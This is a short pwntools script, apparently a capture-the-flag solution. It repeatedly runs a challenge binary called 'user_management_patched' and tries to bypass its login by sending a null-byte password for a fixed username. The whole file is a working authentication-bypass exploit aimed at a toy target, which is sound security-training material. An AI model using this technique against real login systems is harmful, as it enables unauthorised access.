from pwn import *

exe = ELF("./user_management_patched")
libc = ELF("./libc.so.6")
context.binary = exe.path
# context.log_level = "DEBUG"


for _ in range(256):
    io = process(exe.path)
    if args.GDB:
        io = gdb.debug(
            exe.path,
            """
            b rand
            b strncmp@plt
            start
        """,
        )
    elif args.REMOTE:
        io = remote("addr", 1337)

    # io.sendlineafter(b'Enter choice:', b'3')
    # io.sendlineafter(b'username:', b'\x00')
    # io.sendlineafter(b'password:', b'\x00')
    io.sendlineafter(b'Enter choice:', b'1')
    io.sendlineafter(b'here?', b'manage users')
    io.sendlineafter(b'username:', b'MrAlphaQ')
    io.sendlineafter(b'password:', b'\x00')
    print(io.recvline())
    io.close()
    # io.sendlineafter(b'username:', b'\x00')
    # io.interactive()
